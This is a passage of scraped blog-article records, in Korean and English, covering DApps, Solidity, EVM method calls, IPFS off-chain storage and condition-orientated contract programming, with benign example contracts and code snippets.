\uc788\uc2b5\ub2c8\ub2e4. (\ucee4\ubba4\ub2c8\ud2f0\uac00 \uc8fc\ub3c4\ud574\uc11c \uc5c5\ub370\uc774\ud2b8\ub97c \ubc18\uc601\ud560\uc9c0, \ubc18\uc601\ud558\uc9c0 \uc54a\uc744\uc9c0 \uc815\ud558\uae30 \ub54c\ubb38\uc5d0, \uac1c\ubc1c\uc790\ub4e4\uc774 \ub9c8\uc74c\ub300\ub85c \uc11c\ube44\uc2a4\ub97c \ubc14\uafc0 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4).DApp \uc758 \uac00\uc7a5 \uc720\uba85\ud55c \uc608\uc2dc\ub85c\ub294 \ud06c\ub9bd\ud1a0\ud0a4\ud2f0(Cryptokitties)\uac00 \uc788\uc2b5\ub2c8\ub2e4. \ud06c\ub9bd\ud1a0\ud0a4\ud2f0\ub294 DApp\uc73c\ub85c \uad6c\ud604\ub41c \ucd5c\ucd08\uc758 \uac8c\uc784\uc785\ub2c8\ub2e4. \uace0\uc591\uc774\ub97c \uc218\uc9d1, \uad50\ubc30\ud558\ub294\ub370, \uace0\uc591\uc774\ub294 \uac00\uc0c1 \ud654\ud3d0\ub85c \uac70\ub798\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud55c\ub54c \uc774\ub354\ub9ac\uc6c0 \uba54\uc778\ub137\uc744 \ub9c8\ube44\uc2dc\ud0ac \uc815\ub3c4\ub85c \uc778\uae30\ub97c \ub04c\uc5c8\ub358 \uc571\uc774\uae30\ub3c4 \ud558\uba70, \uc5bc\ub9c8\uc804\uc5d4 \ud070 \ud22c\uc790 \uc720\uce58\uae4c\uc9c0 \uc644\ub8cc\ud588\uc2b5\ub2c8\ub2e4. \uac8c\uc784\uc5d0\uc11c \uc0ac\uc6a9\ub418\ub294 \uac70\ub798\uc640 \ub370\uc774\ud130 \uc911 \ud06c\ub9bd\ud1a0 \uc774\ubbf8\uc9c0\uc640 \uac19\uc740 \uc77c\ubc18\uc801\uc778 \ub9ac\uc18c\uc2a4\ub4e4\uc740 \uc911\uc559\ud654\ub41c \uc11c\ubc84\uc5d0\uc11c \uad00\ub9ac\ub97c \ud558\ub098, ERC 721 \ud1a0\ud070 \uc18c\uc720\uad8c\uc5d0 \ub300\ud574\uc11c\ub294 \ube14\ub85d\uccb4\uc778 \uc704\uc5d0 \ub370\uc774\ud130\ub97c \uc62c\ub9ac\ub294 \ud615\uc2dd\uc73c\ub85c \uc6b4\uc601\ud558\uace0 \uc788\uc2b5\ub2c8\ub2e4.CryptoKittiesDelegateCall\ud06c\ub9bd\ud1a0\ud0a4\ud2f0\ub97c \ud3ec\ud568\ud55c \ub300\ubd80\ubd84\uc758 DApp \ub4e4\uc774 \uc77c\ubd80 \ub9ac\uc18c\uc2a4\ub97c \uc911\uc559\ud654\ub41c \uc11c\ubc84\uc5d0 \uc800\uc7a5\ud558\ub294 \uac83\uacfc \ub2ec\ub9ac, DelegateCall(\ube14\ub85d\uccb4\uc778 \uae30\ubc18 Q&A \uc9c8\ubb38 DApp)\ucc98\ub7fc 100% \ube14\ub85d\uccb4\uc778 \uc704\uc5d0\uc11c \ub3cc\uc544\uac00\ub294 \uc11c\ube44\uc2a4\ub3c4 \uc788\uc2b5\ub2c8\ub2e4.\ud604\uc7ac \uc774\ub354\ub9ac\uc6c0 \ube14\ub85d\uccb4\uc778\uc5d0\uc11c \uc6b4\uc601\ub418\uace0 \uc788\ub294 \ub2e4\uc591\ud55c DApp\uc744 \ubcf4\uace0 \uc2f6\uc73c\uc2dc\ub2e4\uba74, \uc774\uacf3\uc5d0\uc11c \ud655\uc778 \uac00\ub2a5\ud569\ub2c8\ub2e4.B. Solidity\ub780?Solidity\ub780 \uc774\ub354\ub9ac\uc6c0 \uae30\ubc18\uc758 \uc2a4\ub9c8\ud2b8 \ucee8\ud2b8\ub799\ud2b8\ub97c \uc791\uc131\ud560 \uc218 \uc788\ub294 \uac1d\uccb4\uc9c0\ud5a5\ud615 \ud504\ub85c\uadf8\ub798\ubc0d \uc5b8\uc5b4\uc785\ub2c8\ub2e4. C++, Python, \uadf8\ub9ac\uace0 \uc790\ubc14\uc2a4\ud06c\ub9bd\ud2b8\uc5d0 \uc601\ud5a5\uc744 \ub9ce\uc774 \ubc1b\uc558\uc73c\uba70, \uc9dc\uc5ec\uc9c4 \uc2a4\ub9c8\ud2b8 \ucee8\ud2b8\ub799\ud2b8\ub294 \uc774\ub354\ub9ac\uc6c0 \uac00\uc0c1 \uba38\uc2e0\uc778 EVM(Ethereum Virtual Machine)\uc5d0\uc11c \uc2e4\ud589\ub429\ub2c8\ub2e4.Solidity is statically typed, supports inheritance, libraries and complex user-defined types among other features.\uc704 \ubb38\uc7a5\uc5d0 \ub098\uc640\uc788\ub4ef\uc774 \uc194\ub9ac\ub514\ud2f0\ub294 \uc815\uc801 \ud0c0\uc785\uc758 \uc5b8\uc5b4\uc774\uba70, \uc0c1\uc18d\uacfc \ub77c\uc774\ube0c\ub7ec\ub9ac, \uc0ac\uc6a9\uc790 \uc815\uc758 \ud0c0\uc785\uc744 \uc9c0\uc6d0\ud558\ub294 \ub4f1 \uc5ec\ub7ec \ud2b9\uc9d5\uc774 \uc788\uc2b5\ub2c8\ub2e4.\ubb3c\ub860 \uc194\ub9ac\ub514\ud2f0 \uc774\uc678\uc5d0\ub3c4 \uc774\ub354\ub9ac\uc6c0 \uae30\ubc18\uc758 DApp\uc744 \ub9cc\ub4e4 \uc218 \uc788\ub294 \uc5b8\uc5b4\ub4e4\uc774 \uc788\uc2b5\ub2c8\ub2e4. \ud558\uc9c0\ub9cc \uc194\ub9ac\ub514\ud2f0\uac00 \uac00\uc7a5 \ub110\ub9ac \uc4f0\uc774\uace0 \uc788\uc2b5\ub2c8\ub2e4. \uac00\uc7a5 \ub9ce\uc774 \uc4f0\uc5ec\uc9c0\ub294 \uc5b8\uc5b4\uc774\ub2e4 \ubcf4\ub2c8 \uc9c0\uc6d0\ub3c4 \ub9ce\uc774 \ub418\uace0, \ubb38\uc11c\ud654\uac00 \uc798 \ub418\uc5b4 \uc788\uc2b5\ub2c8\ub2e4.\uc194\ub9ac\ub514\ud2f0\ub97c \uc0ac\uc6a9\ud558\uba74, \ud22c\ud45c\ub97c \uc704\ud55c DApp\ubd80\ud130, \ud06c\ub77c\uc6b0\ub4dc \ud380\ub529 \uc11c\ube44\uc2a4, \uacbd\ub9e4 \uc2dc\uc2a4\ud15c, \ub2e4\uc911 \uc9c0\uac11 \ub4f1\uc758 \uc11c\ube44\uc2a4\ub4e4\uc744 \uad6c\ud604\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc544\uc9c1 \uc194\ub9ac\ub514\ud2f0\ub97c \uc811\ud558\uc9c0 \uc54a\uc740 \ubd84\uc774\uc2dc\ub77c\uba74, CryptoZombies\ub77c\ub294 \uac8c\uc784\uc744 \ucd94\ucc9c\ud569\ub2c8\ub2e4. \uac8c\uc784\uc744 \ub9cc\ub4e4\uba74\uc11c \uc2a4\ub9c8\ud2b8 \ucee8\ud2b8\ub799\ud2b8\uc5d0 \ub300\ud55c \uac1c\ub150\uacfc \uc791\uc131 \ubc29\ubc95\uc744 \uc27d\uac8c \ubc30\uc6b8 \uc218 \uc788\uc2b5\ub2c8\ub2e4.C. \uac1c\ubc1c \ud658\uacbd\u00a0\uad6c\uc131\ud558\uae30DApp\uc744 \uad6c\ud604\ud558\uae30 \uc704\ud55c \uac1c\ubc1c \ud658\uacbd\uc740 \ud06c\uac8c \ub450 \uac00\uc9c0\ub85c \ub098\ub20c \uc788\uc2b5\ub2c8\ub2e4. \uc2a4\ub9c8\ud2b8 \ucee8\ud2b8\ub799\ud2b8\ub97c \uc791\uc131\ud558\uace0 \ubc30\ud3ec\ud558\ub294 \ubc31\uc5d4\ub4dc \uc0ac\uc774\ub4dc\uc640, \uc0ac\uc6a9\uc790 \uc778\ud130\ud398\uc774\uc2a4\ub97c \uad6c\ud604\ud560 \ud504\ub860\ud2b8\uc5d4\ud2b8 \uc0ac\uc774\ub4dc\uc785\ub2c8\ub2e4. \uc544\ub798 \uadf8\ub9bc\uc740 \uc804\uccb4 \uac1c\ubc1c \ud658\uacbd\uc744 \ud45c\ud604\ud55c \ub2e4\uc774\uc5b4\uadf8\ub7a8\uc785\ub2c8\ub2e4. \uc774 \ub2e4\uc774\uc5b4\uadf8\ub7a8\uc5d0 \ub300\ud55c \uc790\uc138\ud55c \uc124\uba85\uc740 \ubc11\uc5d0\uc11c \uc774\uc5b4\uac00\ub3c4\ub85d \ud558\uaca0\uc2b5\ub2c8\ub2e4.Front-end:HTML/CSS/Javascript\uc6f9 \ud504\ub860\ud2b8\uc5d4\ub4dc\ub97c \uc791\uc131\uc5d0 \uc0ac\uc6a9\ud558\ub294 \uc5b8\uc5b4\ub4e4. \ube14\ub85d\uccb4\uc778 \uae30\ubc18 \uc11c\ube44\uc2a4(DApp)\uc758 \ud074\ub77c\uc774\uc5b8\ud2b8\ub97c \uc6f9 \ube0c\ub77c\uc6b0\uc800 \uae30\ubc18\uc73c\ub85c \ub9cc\ub4e4 \ub54c \ud544\uc694.Web3.js\uc774\ub354\ub9ac\uc6c0 \uc790\ubc14\uc2a4\ud06c\ub9bd\ud2b8 API.Metamask\uc774\ub354\ub9ac\uc6c0 \ud480\ub178\ub4dc\ub97c \uc6b4\uc601\ud558\uc9c0 \uc54a\uace0\ub3c4 \uc6f9 \ube0c\ub77c\uc6b0\uc800\uc5d0\uc11c DApp\uc744 \uc0ac\uc6a9\ud560 \uc218 \uc788\uac8c \ud574\uc8fc\ub294 \ud06c\ub86c \ubc0f \ud30c\uc774\uc5b4\ud3ed\uc2a4 \ud655\uc7a5 \ud504\ub85c\uadf8\ub7a8. \uc989, \uc77c\ubd80 \ud544\uc218\uc801\uc778 \ube14\ub85d \ud5e4\ub354 \ub370\uc774\ud130\ub9cc \uc678\ubd80\uc758 \ud480\ub178\ub4dc\ub85c\ubd80\ud130 \ubc1b\uc544\uc640 \uac80\uc99d\ud558\ub294 \ub77c\uc774\ud2b8 \ud074\ub77c\uc774\uc5b8\ud2b8 \uc911 \ud558\ub098.\uba54\ud0c0\ub9c8\uc2a4\ud06c\ub97c \uc0ac\uc6a9\ud558\uba74 \uc5ec\ub7ec \uc0ac\uc774\ud2b8\uc758 \uacc4\uc815\uc744 \uad00\ub9ac\ud558\uace0, \ube14\ub85d\uccb4\uc778 \ud2b8\ub79c\uc7ad\uc158\uc5d0 \uc11c\uba85\ud560 \uc218 \uc788\uc74c.Back-end:Solidity\uc774\ub354\ub9ac\uc6c0\uc758 \uc2a4\ub9c8\ud2b8 \ucee8\ud2b8\ub799\ud2b8\ub97c \uc791\uc131\ud560 \uc218 \uc788\ub294 \uac1d\uccb4\uc9c0\ud5a5\ud615 \ud504\ub85c\uadf8\ub798\ubc0d \uc5b8\uc5b4Remix IDE\uc194\ub9ac\ub514\ud2f0 \ucf54\ub4dc\ub97c \uc791\uc131\ud558\uace0 \ucef4\ud30c\uc77c \ubc0f \ubc30\ud3ec\uae4c\uc9c0 \uc27d\uac8c \uc790\ub3d9\uc73c\ub85c \ud560 \uc218 \uc788\ub3c4\ub85d \ub3d5\ub294 \uc628\ub77c\uc778 \ucef4\ud30c\uc77c\ub7ec \ud234. \ub514\ubc84\uae45 \ud234\ub85c\ub3c4 \ub9ce\uc774 \uc4f0\uc784.\uc6d0\ub798\ub294 \ub85c\uceec \ucef4\ud4e8\ud130\uc5d0 \uc9c1\uc811 \uc194\ub9ac\ub514\ud2f0 \ucef4\ud30c\uc77c\ub7ec\ub97c \uc124\uce58\ud574\uc57c\ud558\ub294\ub370, \ub9ac\ubbf9\uc2a4 \uc6f9\ube0c\ub77c\uc6b0\uc800\ub97c \uc0ac\uc6a9\ud558\uba74 \uadf8\ub7f0 \uacfc\uc815\uc5c6\uc774 \uc27d\uace0 \ube60\ub974\uac8c \ucef4\ud30c\uc77c \ubc0f \ubc30\ud3ec\uac00 \uac00\ub2a5TestRPC(\ud604\uc7ac Ganache\ub85c \uc5c5\ub370\uc774\ud2b8\ub428)\uac1c\ubc1c \ub2e8\uacc4\uc5d0\uc11c \uc2e4\uc81c \uc774\ub354\uc5c6\uc774 \uc2dc\ubbac\ub808\uc774\uc158 \ud14c\uc2a4\ud2b8 \ud658\uacbd\uc744 \uad6c\uc131\ud560 \uc218 \uc788\uac8c \ud574\uc8fc\ub294 \ud234. \uc6d0\ub798 \uc774\ub354\ub9ac\uc6c0 \uba54\uc778\ub137\uc5d0\uc11c \ud14c\uc2a4\ud2b8\ub97c \ud558\ub824\uba74 \uc2e4\uc81c \uc774\ub354\uac00 \ud544\uc694\ud558\uc9c0\ub9cc, TestRPC \ub97c \uc0ac\uc6a9\ud558\uba74 \ub9c8\uc774\ub2dd \uc5c6\uc774 \uac00\uc0c1\ud658\uacbd\uc5d0\uc11c \ub9ac\uc18c\uc2a4, \ud2b8\ub79c\uc7ad\uc158\uc5d0 \ub300\ud55c \uc81c\ud55c \uc5c6\uc774 \uc774\ub354\ub9ac\uc6c0\uc744 \ub9cc\ub4e4\uc5b4\ub0b4\uc11c \ud14c\uc2a4\ud2b8\ub97c \ud560 \uc218 \uc788\uc74c.TestNet\uc774\ub354\ub9ac\uc6c0\uc758 \ud37c\ube14\ub9ad \ud14c\uc2a4\ud2b8 \ub124\ud2b8\uc6cc\ud06c. \ud604\uc7ac \uc544\ub798\uc640 \uac19\uc740 3\uac1c\uc758 \ud37c\ube14\ub9ad \ud14c\uc2a4\ud2b8\ub137\uc744 \uc81c\uacf5.Ropsten (Proof of Work): \ud504\ub85c\ub355\uc158 \ud658\uacbd\uc774 \uc2e4\uc81c \uba54\uc778\ub137\uc774\ub791 \uac00\uc7a5 \ube44\uc2b7\ud558\uc5ec (PoW \uc774\uae30 \ub54c\ubb38\uc5d0) \ud604\uc7ac \uac00\uc7a5 \ub9ce\uc774 \uc4f0\uc5ec\uc9c0\uace0 \uc788\ub294 \ud14c\uc2a4\ud2b8 \ub124\ud2b8\uc6cc\ud06c. Geth \uc640 Parity \ud074\ub77c\uc774\uc5b8\ub4dc \ub458\ub2e4 \uc9c0\uc6d0. \uc774\uc804\uc5d0 \uc2a4\ud338 \uc5b4\ud0dd\uc744 \ub2f9\ud55c \uc774\ub825\uc774 \uc788\uc74c\u2026 \uc774\ub354 \ub9c8\uc774\ub2dd\uc774 \uac00\ub2a5\ud558\uba70, \ud14c\uc2a4\ud2b8 \uc774\ub354\ub97c \uc694\uccad\ud560 \uc218 \uc788\ub2e4.Kovan (Proof of Authority): Parity \ud300\uc774 \ub78d\uc2a4\ud150\uc758 \ubb38\uc81c\ub97c \ud574\uacb0\ud558\uae30 \uc704\ud574 \uac1c\ubc1c\ud55c \ud14c\uc2a4\ud2b8 \ub124\ud2b8\uc6cc\ud06c. \uc2a4\ud338\uc5b4\ud0dd\uc73c\ub85c\ubd80\ud130 \uc548\uc804\ud558\uba70, Parity \ud074\ub77c\uc774\uc5b8\ud2b8\ub9cc \uc9c0\uc6d0. \uc774\ub354 \ub9c8\uc774\ub2dd \ubd88\uac00\ub2a5\ud558\uba70, \ud14c\uc2a4\ud2b8 \uc774\ub354 \uc694\uccad \ud544\uc694.Rinkeby (Proof of Authority): Rinkeby \uc5ed\uc2dc \uc2a4\ud338 \uc5b4\ud0dd\uc744 \ubc29\uc9c0\ud558\uace0\uc790 \ub9cc\ub4e4\uc5b4\uc84c\uc73c\uba70, \uc774\ub354\ub9ac\uc6c0 \ud300\uc774 \uac1c\ubc1c\ud55c \ud14c\uc2a4\ud2b8\ub137. Geth \ud074\ub77c\uc774\uc5b8\ud2b8\ub9cc \uc9c0\uc6d0. \uc774\ub354 \ub9c8\uc774\ub2dd \ubd88\uac00\ub2a5\ud558\uba70, \ud14c\uc2a4\ud2b8 \uc774\ub354 \uc694\uccad \uac00\ub2a5.Mainnet\uc2e4\uc81c \uac70\ub798\uac00 \uc774\ub8e8\uc5b4\uc9c0\ub294 \uc774\ub354\ub9ac\uc6c0\uc758 \uba54\uc778 \ub124\ud2b8\uc6cc\ud06c.", "responses": "14"}, {"title": "How To Decipher A Smart Contract Method\u00a0Call", "author_name": "Howard", "link": "https://medium.com/@hayeah/how-to-decipher-a-smart-contract-method-call-8ee980311603?source=search_post", "post_date": "Sep 18, 2017", "readtime": "11 min read", "upvotes": "1.2K", "content": "How To Decipher A Smart Contract Method\u00a0CallHowardBlockedUnblockFollowFollowingSep 18, 2017Diving Into The Ethereum VM Part\u00a04In previous articles of this series we\u2019ve seen how Solidity represents complex data structures in the EVM storage. But data is useless if there\u2019s no way to interact with it. The Smart Contract is the mediator between data and the outside world.In this article we\u2019ll see how Solidity and EVM makes it possible for external programs to call a contract\u2019s methods and cause its state to change.The \u201cexternal program\u201d is not limited to DApp/JavaScript. Any program that can communicate with an Ethereum node using HTTP RPC can interact with any contract deployed on the blockchain by creating transactions.Creating a transaction is like making an HTTP request. A web server would accept your HTTP request and make changes to the database. A transaction would be accepted by the network, and the underlying blockchain extended to include the state changes.Transactions are to Smart Contracts as HTTP requests are to web services.", "responses": "7"}, {"title": "Off-Chain Data Storage: Ethereum &\u00a0IPFS", "author_name": "Adil H", "link": "https://medium.com/@didil/off-chain-data-storage-ethereum-ipfs-570e030432cf?source=search_post", "post_date": "Oct 17, 2017", "readtime": "3 min read", "upvotes": "552", "content": "Off-Chain Data Storage: Ethereum &\u00a0IPFSSaving on\u00a0gasAdil HBlockedUnblockFollowFollowingOct 17, 2017The Ethereum gas costs\u00a0issueMost Decentralized Apps running on the Ethereum Platform need to store/retrieve data, just like conventional or \u201ccentralized\u201d apps do using PostgreSQL, MongoDB, Redis, etc. The EVM (Ethereum Virtual Machine) does indeed allow us to save variables/state in permanent storage. Let\u2019s look at this simple Solidity contract:pragma solidity ^0.4.17;contract Database {    bytes x;    function write(bytes _x) public {      x = _x;    }        function read() public view returns (bytes) {      return x;    }}I\u2019ve deployed this contract on Rinkeby test net and generated 1024 of random bytes using https://www.random.org then stored 1kB of data using the write function. The resulting transaction can be seen here\u00a0: https://rinkeby.etherscan.io/tx/0x6575badcafbc4db521e82904fa14b04bd8e862de1c82f62e064e699d0f90ebe3The Gas used amounted to 754,365 @ 20Gwei Gas price = 0.0150873 Ether. At the time of writing this post (Oct 17, 2017) the Ether price is currently 328.79 USD/ETH. So storing 1kB of data would have cost $4.96 to run on the Ethereum Main Net. That means ~ 5 Million USD / GB\u00a0!AlternativesSaving a few bytes to the EVM is ok but for larger chunks of data the costs are probably too high for most projects. One solution is to modify our data storage strategy and save the data off-chain (as opposed to the on-chain approach we took above). There are multiple off-chain storage options: IPFS and Swarm are 2 popular ones. I\u2019ll use IPFS in this post but Swarm works equally well.Enter IPFSLooking at the wikipedia article on IPFS\u00a0:InterPlanetary File System (IPFS) is a protocol designed to create a permanent and decentralized method of storing and sharing filesIPFS allows p2p storage and we can use it as a distributed file system to store data.Low Cost Data Storage StrategySaving data on IPFS provides a unique hash. Instead of storing the data on the contract, we\u2019ll only store the hash on the contract and then we can use the hash to retrieve the data.In production we\u2019d need to create our own IPFS node, but INFURA provides a node for developers which we can use for free.Here is a js snippet you can try out on https://npm.runkit.com/ to save data to IPFS\u00a0:const IPFS = require(\u2018ipfs-mini\u2019);const ipfs = new IPFS({host: \u2018ipfs.infura.io\u2019, port: 5001, protocol: \u2018https\u2019});const randomData = \u201c8803cf48b8805198dbf85b2e0d514320\u201d; // random bytes for testingipfs.add(randomData, (err, hash) => { if (err) {   return console.log(err); }  console.log(\u201cHASH:\u201d, hash);});this should return the hash \u201cQmaj3ZhZtHynXc1tpnTnSBNsq8tZihMuV34wAvpURPZZMs\u201d which we can use to query our data:const IPFS = require(\u2018ipfs-mini\u2019);const ipfs = new IPFS({host: \u2018ipfs.infura.io\u2019, port: 5001, protocol: \u2018https\u2019});const hash = \u201cQmaj3ZhZtHynXc1tpnTnSBNsq8tZihMuV34wAvpURPZZMs\u201d;ipfs.cat(hash, (err, data) => { if (err) {   return console.log(err); }  console.log(\u201cDATA:\u201d, data);});and this should return our data\u00a0: \u201c8803cf48b8805198dbf85b2e0d514320\u201dOne remark is that the hash string size is independent of the data size, which means we can store large data chunks or files on IPFS (I couldn\u2019t find a current size restriction) without increasing our Ethereum transaction costs\u00a0!I\u2019ve used our previous contract to store the IPFS hash generated above\u00a0:https://rinkeby.etherscan.io/tx/0x53ae68a0f7302d8808d836c560f54f83b2b870f02b136338c8abde03f2e3cfb9The gas usage has decreased to 40,907 @ 20Gwei Gas price = 0.00081814 Ether = 0.27 USDWe now have a much more acceptable storage cost and it should be pretty much constant independently of what we\u2019re storing on IPFS\u00a0!Example Project: Stone DappI\u2019ve built a small proof-of-concept project around this idea called Stone Dapp, feel free to check it out\u00a0:Github\u00a0: https://github.com/didil/stone-dappLive version (Rinkeby)\u00a0: https://stone-dapp.firebaseapp.comP.S.: In the examples above I\u2019ve set the Gas Price to 20 GWei. To help you choose the Gas Price you want to pay, you could check out http://ethgasstation.info\u00a0. ETH Gas Station provides transaction confirmation time estimates and other useful network stats.", "responses": "8"}, {"title": "Condition-Orientated Programming", "author_name": "Gavin Wood", "link": "https://medium.com/@gavofyork/condition-orientated-programming-969f6ba0161a?source=search_post", "post_date": "Jun 26, 2016", "readtime": "6 min read", "upvotes": "389", "content": "Condition-Orientated ProgrammingGavin WoodBlockedUnblockFollowFollowingJun 26, 2016Condition-Orientated Programming (COP) is subdomain of contract-orientated programming, and sits as a hybrid approach between functional and imperative programming. Done properly it is a tool in your arsenal for writing safe, secure contracts. It helps make your contract code comprehensively auditable and\u200a\u2014\u200aloosely speaking\u200a\u2014\u200ainformally provable to have correct run-time operation.COP is not language specific; it is more of a loose methodology than particular syntax. However, with its function modifiers and events, it is particularly well-suited to the Solidity language.Simply put, COP has just one main aim:Function bodies should have no conditional paths.Or alternatively:Never mix transitions with conditions.This may seem like a difficult goal to achieve for an imperative language, since conditional paths are how you achieve the rich state-transitions which allow interesting operational dynamics. To achieve it, we try to split all conditions apart from the state-transitions that they guard. We name each independently and combine to form real functions.The problem with such conditional paths within transition logic is that they add conceptual non-linearity over state semantics. Potential bugs hide when the programmer believes a conditional (and thus the state it projects onto) means one thing when in fact it means something subtly different.A single-level conditional is bad enough, but when multi-level conditionals are introduced, the complexity (i.e. the paths which the programmer must consider in all states of the world) increases exponentially and it quickly becomes impossible to reason about the entire contract\u2019s state transitions without formal tools not generally available.COP addresses this by requiring the programmer to explicitly enumerate all such conditionals. Logic becomes flattened into non-conditional state-transactions. The condition fragments can then be properly documented, reused, reasoned-about and attributed with requirements and implications. Essentially, COP uses pre-conditions as a first-class citizen in programming.How it\u00a0worksIf you have already used Solidity, the chances are that you inadvertently flirted with COP already. Let\u2019s look at a simple token contract:contract Token {    // The balance of everyone    mapping (address => uint) public balances;    // Constructor - we're a millionaire!    function Token() {        balances[msg.sender] = 1000000;    }    // Transfer `_amount` tokens of ours to `_dest`.    function transfer(uint _amount, address _dest) {        balances[msg.sender] -= _amount;        balances[_dest] += _amount;    }}The astute reader will realise there is a bug here: the transfer function doesn\u2019t ensure that the sender has enough in their account. The normal imperative-language fix for this would be to introduce a conditional into the body:function transfer(uint _amount, address _dest) {    if (balances[msg.sender] >= _amount) {        balances[msg.sender] -= _amount;        balances[_dest] += _amount;    }}Or perhaps:function transfer(uint _amount, address _dest) {    if (balances[msg.sender] < _amount)        return;    balances[msg.sender] -= _amount;    balances[_dest] += _amount;}However both of these solutions rather miss the point of COP; we\u2019re muddling the implementation (which ever one we choose) with the meaning, which remains the same in both cases: that the executing account msg.sender, should have a balance of at least _amount. As a COP coder, we understand this problem perfectly since both solutions break our fundamental rule:Function bodies should have no conditional paths.So in COP, we rather abstract the condition (balances[msg.sender] >= _amount) and create a function modifier:modifier only_with_at_least(uint x) {    if (balances[msg.sender] >= x) _}This piece of code fundamentally abstracts the notion of \u201cexecuting account has a balance of at least some particular amount\u201d. With it in place, we no longer need to think in terms of conditionals, and most importantly, we don\u2019t need to mix pre-condition logic with state-transition logic. This allows a far greater scope for human-understandable analysis of state-transitions.Here\u2019s the new transfer function:function transfer(uint _amount, address _dest)only_with_at_least(_amount) {    balances[msg.sender] -= _amount;    balances[_dest] += _amount;}Abstraction and\u00a0ReuseSuppose we have another function, which allows anyone with a balance more than 1000 to vote on some issue. We\u2019ll assume for now that voting is just a case of setting the value of an address-indexed mapping.In our old scheme of things, we\u2019d have a function like this:function vote(uint _opinion) {    if (balances[msg.sender] >= 1000) {        votes[msg.sender] = _opinion;    }}Added to our old codebase, we would now have two similar-meaning conditionals. In principle, we would like to have only one such conditional, audited and documented once but used twice. With COP that\u2019s exactly what we do:function vote(uint _opinion) only_when_at_least(1000) {    votes[msg.sender] = _opinion;}This makes our vote function substantially more readable and allows us to reuse important guard-logic, minimising our potential attack surface.More complex transitionsBy discouraging conditional paths from our state-transitions, we limit the complexity of our state-transitions. This hugely helps with auditing since it allows us apply the divide and conquer strategy to program logic analysis and independently check the logic of state transitions from the conditional logic on which they are gated. However sometimes the state transition itself includes gated logic internally.Following on the voting example, suppose we extend the transfer function so that we ensure that any new, reduced, balance has no vote.In the traditional, imperative, way we would simply place a conditional near the balance reduction code:function transfer(uint _amount, address _dest) {    if (balances[msg.sender] >= _amount) {        balances[msg.sender] -= _amount;        balances[_dest] += _amount;        if (balances[msg.sender] < 1000) {            votes[msg.sender] = 0;    // Clear their vote.        }    }}This rather goes against the grain of COP. However we cannot address this directly with a new function modifier since there is no obvious function to modify; we actually wish to place the guard within an internal scope of transfer. In this case (at least with Solidity), we rather create a new (inline) function:function clear_undeserved_vote(account _who)only_with_under(1000)only_when_voted {    delete votes[_who];}Note inline is not yet available in Solidity; we would use it here whenever it be available. This function relies on two modifiers which are easily coded (and audited):modifier only_with_under(uint x) { if (balances[msg.sender] < x) _ }modifier only_when_voted { if (votes[msg.sender] != 0) _ }We can then use this function within our transfer function:function transfer(uint _amount, address _dest)only_with_at_least(_amount) {    balances[msg.sender] -= _amount;    balances[_dest] += _amount;    clear_undeserved_vote();}ConclusionThe main part of our final contract has changed from:contract Token{    //...    function transfer(uint _amount, address _dest) {        if (balances[msg.sender] >= _amount) {            balances[msg.sender] -= _amount;            balances[_dest] += _amount;            if (balances[msg.sender] < 1000) {                votes[msg.sender] = 0;    // Clear their vote.            }        }    }    function vote(uint _opinion) {        if (balances[msg.sender] >= 1000) {            votes[msg.sender] = _opinion;        }    }}To the new:contract Token{    //...    modifier only_with_at_least(uint x) {        if (balances[msg.sender] >= x) _    }    modifier only_with_under(uint x) {        if (balances[msg.sender] < x) _    }    modifier only_when_voted {        if (votes[msg.sender] != 0) _    }    function clear_undeserved_vote(account _who)    only_with_under(1000) only_when_voted {        delete votes[_who];    }    function transfer(uint _amount, address _dest)    only_with_at_least(_amount) {        balances[msg.sender] -= _amount;        balances[_dest] += _amount;        clear_undeserved_vote();    }    function vote(uint _opinion)    only_when_at_least(1000) {        votes[msg.sender] = _opinion;    }}The code we have is somewhat longer, however it has now forced the coder to document the internals, encouraging them to place weight on considering the conditions in isolation and abstracts the important parts to ensure that no copy/paste bugs creep in. The execution structure is flat, easing the conceptual baggage that the auditor must consider. It can be documented and audited, piece-by-piece in a comprehensive and methodical fashion. And, even if left undocumented, it is far more comprehensible, with the named conditions over the original version which muddles them into the transition logic.Being rather verbose, COP certainly won\u2019t be to everyone\u2019s taste. And without certain language support, it can become somewhat unwieldy with large contracts. However, for small and medium-size contracts it provides the programmer and auditor with a clear path to enlightenment that can otherwise be difficult to attain.In the next article in this series I\u2019ll take a \u201creal-world\u201d contract, coded in COP style, and show how it can be broken down, documented and informally demonstrated to be correct.", "responses": "18"}, {"title": "Getting started with Smart Contracts", "author_name": "Vamshi Vangapally", "link": "https://hackernoon.com/getting-started-with-smart-contracts-3085611c95de?source=search_post", "post_date": "Jul 23, 2017", "readtime": "2 min read", "upvotes": "548", "content": "Getting started with Smart ContractsVamshi VangapallyBlockedUnblockFollowFollowingJul 23, 2017I am primarily a JS developer with an aesthetic sense and major focus on building an end to end product.Having ventured into the area of blockchain and smart contracts without any help, struggled a bit on finding right resources which are relevant and understandable by a front-end developer(javascript and related world).If you are completely new and want to know what a smart contract is, you might have to read through this. Once you know what is it and want to go ahead and create one, you can follow the stuff below.In this journey, I\u2019ve managed to create a sequence of resources to be followed to avoid randomness(which I\u2019ve been through).Pre gyan session:A 101 Noob Intro to Programming Smart Contracts on EthereumSome general gyan before you start:Getting Started as an Ethereum Web DeveloperSequence of articles I\u2019ve followedHow to deploy the smart contractHow to build your first \u00d0app through web3.jsA simple smart contract Web UI using web3.jsHyper-ledger Fabric and It\u2019s purposesIn general, if you want to choose a side or entrepreneur or developer or a middleman* The ultimate Ethereum blockchain startup guideSmart Contracts - Hacker NoonRead writing about Smart Contracts in Hacker Noon. how hackers start their afternoons.hackernoon.com", "responses": "1"}, {"title": "Ethereum in Depth, Part\u00a01", "author_name": "Facu Spagnuolo", "link": "https://blog.zeppelin.solutions/ethereum-in-depth-part-1-968981e6f833?source=search_post", "post_date": "May 11, 2018", "readtime": "10 min read", "upvotes": "688", "content": "Ethereum in Depth, Part\u00a01Facu SpagnuoloBlockedUnblockFollowFollowingMay 11, 2018Photo by Bryn Parish on Unsplash.Welcome to the first part of a two-posts series aimed at software developers looking to understand how the EVM works. The idea is to explain and describe in detail core behavior of the EVM. We will see how contracts are created, how message calls work, and take a look at everything related to data management, such as storage, memory, calldata, and the stack.To better understand this article, you should be familiar with the basics of the EVM. If you are not, I highly recommend reading these posts first.Throughout this post we will illustrate some examples and demonstrations using sample contracts you can find in this repository. Please clone it, run npm install, and check it out before beginning.Enjoy, and please do not hesitate to reach out with 